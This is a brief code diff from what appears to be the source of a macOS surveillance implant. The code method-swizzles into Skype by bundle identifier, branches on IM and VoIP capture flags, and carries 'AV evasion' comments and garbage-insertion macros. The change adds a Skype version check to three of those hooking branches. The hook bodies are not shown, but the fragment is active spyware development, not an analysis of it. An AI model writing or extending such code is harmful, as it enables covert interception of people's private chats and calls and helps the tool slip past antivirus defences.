@@ -1372,7 +1372,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         AV_GARBAGE_004
         
       }
-      else if([bundleIdentifier isEqualToString: @"com.skype.skype"])
+      else if([bundleIdentifier isEqualToString: @"com.skype.skype"] && isSkypeVersionSupported())
       {   
         // AV evasion: only on release build
         AV_GARBAGE_007 
@@ -1429,7 +1429,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         AV_GARBAGE_005
       }
     }
-    else if (imFlag == 3)
+    else if (imFlag == 3 && isSkypeVersionSupported())
     {   
       // AV evasion: only on release build
       AV_GARBAGE_009 
@@ -1517,7 +1517,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       AV_GARBAGE_009
     }
     
-    if (voipFlag == 1)
+    if (voipFlag == 1 && isSkypeVersionSupported())
     {   
       // AV evasion: only on release build
       AV_GARBAGE_006 
